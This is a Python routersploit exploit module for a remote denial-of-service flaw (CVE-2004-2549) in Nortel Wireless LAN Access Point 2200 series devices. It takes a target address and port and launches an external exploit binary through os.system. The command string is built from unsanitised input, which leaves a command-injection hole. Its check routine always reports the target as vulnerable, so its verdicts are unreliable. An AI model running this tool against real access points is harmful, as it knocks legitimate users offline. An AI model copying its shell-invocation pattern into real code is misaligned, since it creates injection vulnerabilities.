import sys,os
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):


    __info__ = {
        "name": "Nortel_Wireless_LAN_Access_Point_2200_Series-Denial_of_Service",

        "description": " Nortel Wireless LAN Access Point 2200 series appliances have been  "
                       " reported to be prone to a remote denial of service vulnerability.  "
                       " The issue is reported to present itself when a large network request "
                       "is handled by one of the Wireless LAN Access Point default administration"
                       " services. This will reportedly cause the Access Point Appliance "
                       "Operating service to crash, effectively denying service to legitimate users.",

        "authors": (

            "Shaun Colley",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "https://www.exploit-db.com/exploits/23786",

        ),

        "devices": (

            "Nortel, CVE-2004-2549"
        ),
    }


    target = OptIP("", "AP/Host ")
    port = OptPort("", "Target HTTP port")



    
    def run(self):

        if self.check():
            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = "./exploit-db-23786 {} {}".format(self.target,self.port)
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True